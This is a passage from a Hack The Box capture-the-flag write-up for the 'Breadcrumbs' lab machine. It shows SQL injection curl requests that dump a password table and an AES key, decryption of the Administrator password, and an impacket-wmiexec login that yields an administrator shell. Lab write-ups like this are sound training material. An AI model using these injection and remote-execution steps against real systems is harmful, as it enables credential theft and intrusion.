One table here, let's look at its column's names.

```bash
┌──(root💀f4T1H)-[~/hackthebox/breadcrumbs]
└─> curl 'http://passmanager.htb:1234/index.php' -d "method=select&username=administ'union select column_name from information_schema.columns where table_schema='bread'-- -rator&table=passwords"
selectarray(4) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(2) "id"
  }
  [1]=>
  array(1) {
    ["aes_key"]=>
    string(7) "account"
  }
  [2]=>
  array(1) {
    ["aes_key"]=>
    string(8) "password"
  }
  [3]=>
  array(1) {
    ["aes_key"]=>
    string(7) "aes_key"
  }
}
```

Four columns, and looking at their content gives us a password and an aes key...

```bash
┌──(root💀f4T1H)-[~/hackthebox/breadcrumbs]
└─> curl 'http://passmanager.htb:1234/index.php' -d "method=select&username=administ'union select concat(id,':::',account,':::',password,':::',aes_key) from bread.passwords-- -rator&table=passwords"
selectarray(1) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(83) "1:::Administrator:::H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=:::k19D193j.<19391("
  }
}
```

Last but not least, we use [CyberChef](https://gchq.github.io/CyberChef/) to decrypt our aes encrypted password using the key we dumped and providing one byte characters until it becomes able to proceed the cryptologic operation.

![](src/cyberchef.png)

And we got the Administrator password:

```
p@ssw0rd!@#$9890./
```

Finally...

```powershell
┌──(root💀f4T1H)-[~/hackthebox/breadcrumbs]
└─> impacket-wmiexec Administrator@10.10.10.228
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
breadcrumbs\administrator

C:\>type \Users\Administrator\Desktop\root.txt
4d7eb5348ab499218d992ec76716d28a

C:\>
```

We hacked that windows machine successfully.

![](/src/gifs/pwned.gif)

---

# Closing
This writeup took me more than four (6) days to finish. Please consider [suporting](https://www.buymeacoffee.com/f4T1H21) a student to get `OSCP` exam and __+respecting__ my profile in HTB.

<a href="https://app.hackthebox.eu/profile/184235">
  <img src="https://www.hackthebox.eu/badge/image/184235" alt="f4T1H">
  </img>
</a>
<br>
<a href="https://www.buymeacoffee.com/f4T1H21">
  <img src="https://github.com/f4T1H21/f4T1H21/blob/main/support.png" width="221" height="40" alt="Support">
  </img>
</a>

# Resources
|`JWT Debugger`|https://jwt.io|
|:-|:-|
|__`SQL Information Schema`__|__https://dev.mysql.com/doc/refman/8.0/en/information-schema.html__|
|__`CyberChef`__|__https://gchq.github.io/CyberChef/__|

<br>

___-Written by f4T1H-___
